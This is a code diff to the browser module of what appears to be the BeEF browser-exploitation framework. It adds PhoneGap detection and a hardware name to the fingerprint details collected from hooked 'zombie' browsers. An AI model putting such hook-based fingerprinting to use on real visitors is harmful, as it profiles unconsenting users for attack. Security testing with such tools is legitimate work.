@@ -552,6 +552,19 @@ beef.browser = {
 	},
 
 	/**
+	 * Checks if the Phonegap API is available from the hooked domain.
+	 * @return: {Boolean} true or false.
+	 *
+	 * @example: if(beef.browser.hasJava()) { ... }
+	*/
+	hasPhonegap: function() {
+		var result = false;
+		try { if (!!device.phonegap) result = true; else result = false; }
+		catch(e) { result = false; }
+		return result;
+	},
+
+	/**
 	 * Checks if the zombie has Java installed and enabled.
 	 * @return: {Boolean} true or false.
 	 *
@@ -765,6 +778,7 @@ beef.browser = {
 		var browser_plugins = beef.browser.getPlugins();
 		var date_stamp = new Date().toString();
 		var os_name = beef.os.getName();
+		var hw_name = beef.hardware.getName();
 		var system_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
 		var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {if (value == true) return value; else if (typeof value == 'object') return value; else return;});
 		var screen_size = beef.browser.getScreenSize();
@@ -772,6 +786,7 @@ beef.browser = {
 		var java_enabled = (beef.browser.javaEnabled())? "Yes" : "No";
 		var vbscript_enabled=(beef.browser.hasVBScript())? "Yes" : "No";
 		var has_flash = (beef.browser.hasFlash())? "Yes" : "No";
+		var has_phonegap = (beef.browser.hasPhonegap())? "Yes" : "No";
 		var has_googlegears=(beef.browser.hasGoogleGears())? "Yes":"No";
 		var has_web_socket=(beef.browser.hasWebSocket())? "Yes":"No";
 		var has_activex = (typeof(window.ActiveXObject) != "undefined") ? "Yes":"No";
@@ -789,6 +804,7 @@ beef.browser = {
 		if(hostport) details["HostPort"] = hostport;
 		if(browser_plugins) details["BrowserPlugins"] = browser_plugins;
 		if(os_name) details['OsName'] = os_name;
+		if(hw_name) details['Hardware'] = hw_name;
 		if(date_stamp) details['DateStamp'] = date_stamp;
 		if(system_platform) details['SystemPlatform'] = system_platform;
 		if(browser_type) details['BrowserType'] = browser_type;
@@ -797,6 +813,7 @@ beef.browser = {
 		if(java_enabled) details['JavaEnabled'] = java_enabled;
 		if(vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled
 		if(has_flash) details['HasFlash'] = has_flash
+		if(has_phonegap) details['HasPhonegap'] = has_phonegap
 		if(has_web_socket) details['HasWebSocket'] = has_web_socket
 		if(has_googlegears) details['HasGoogleGears'] = has_googlegears
 		if(has_activex) details['HasActiveX'] = has_activex;
